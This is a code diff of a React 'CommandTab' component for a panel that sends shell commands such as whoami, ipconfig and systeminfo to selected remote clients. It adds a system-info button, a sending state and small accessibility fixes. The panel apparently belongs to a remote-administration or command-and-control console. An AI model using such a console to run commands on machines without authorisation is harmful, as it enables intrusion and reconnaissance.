@@ -3,18 +3,24 @@ import { apiService } from '../services/api.js';
 
 function CommandTab({ selectedClient, clients, onClientSelect, setStatus, refreshMessages }) {
     const [command, setCommand] = React.useState('');
+    const [sending, setSending] = React.useState(false);
 
-    const sendCommand = async () => {
-        if (!selectedClient || !command) return;
+    const sendCommand = async (nativeInfo = false) => {
+        if (!selectedClient || sending || (!nativeInfo && !command.trim())) return;
+        setSending(true);
         
         try {
-            const data = await apiService.sendCommand(selectedClient, command);
+            const data = nativeInfo
+                ? await apiService.mySendCommand(selectedClient, 'systeminfo')
+                : await apiService.sendCommand(selectedClient, command);
             if (data.status?.includes('Failed')) throw new Error(data.status);
-            setStatus('✅ Command sent - waiting for response...');
-            setCommand('');
+            setStatus(nativeInfo ? '✅ System info requested - waiting for response...' : '✅ Command sent - waiting for response...');
+            if (!nativeInfo) setCommand('');
             refreshMessages();
         } catch (error) {
             setStatus('Error: ' + error.message);
+        } finally {
+            setSending(false);
         }
     };
 
@@ -30,7 +36,7 @@ function CommandTab({ selectedClient, clients, onClientSelect, setStatus, refres
 
     return (
         <div>
-            <h3>📝 Execute Commands:</h3>
+            <h3>Commands</h3>
             <select 
                 value={selectedClient} 
                 onChange={(e) => onClientSelect(e.target.value)}
@@ -48,12 +54,18 @@ function CommandTab({ selectedClient, clients, onClientSelect, setStatus, refres
                 onChange={(e) => setCommand(e.target.value)}
                 placeholder="Enter command (e.g., whoami, ipconfig, dir)"
                 style={{width: '300px'}}
-                onKeyPress={(e) => e.key === 'Enter' && sendCommand()}
+                aria-label="Shell command"
+                onKeyDown={(e) => e.key === 'Enter' && sendCommand()}
             />
-            <button onClick={sendCommand} disabled={!selectedClient || !command}>
+            <button onClick={() => sendCommand()} disabled={!selectedClient || !command.trim() || sending}>
                 Send Command
             </button>
             
+            <div className="native-commands">
+                <h4>Host information</h4>
+                <button onClick={() => sendCommand(true)} disabled={!selectedClient || sending}>Get system info</button>
+                <p className="muted">Request the client's native OS, memory, and processor information. The systeminfo quick command below runs the Windows shell command.</p>
+            </div>
             <div className="quick-commands">
                 <h4>⚡ Quick Commands:</h4>
                 {quickCommands.map((cmd, index) => (
